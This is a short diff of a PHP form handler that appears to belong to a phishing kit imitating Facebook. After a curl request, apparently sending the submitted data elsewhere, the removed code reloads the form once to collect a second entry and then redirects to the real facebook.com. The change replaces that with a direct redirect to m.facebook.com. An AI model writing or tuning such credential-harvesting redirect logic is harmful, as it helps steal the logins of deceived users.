@@ -39,29 +39,9 @@ $response = curl_exec($ch);
 curl_close($ch);
 
 
-
-
 /*|--------------------------------------------------------------------------|
-   First submission
+   Form submission
 |--------------------------------------------------------------------------*/
-
-if (!isset($_SESSION['first_submit'])) {
-
-    $_SESSION['first_submit'] = true;
-
-    // Reload the form page
-    header("Location: index.php?r=" . time()); // Change this to your actual form page
-    exit();
-}
-
-/*--------------------------------------------------------------------------|
-  Second submission
-|--------------------------------------------------------------------------*/
-
-// Clear the session so the process starts over next time
-unset($_SESSION['first_submit']);
-
-// Redirect after second submission
-header("Location: https://facebook.com");
+header("Location: https://m.facebook.com");
 exit();
 ?>
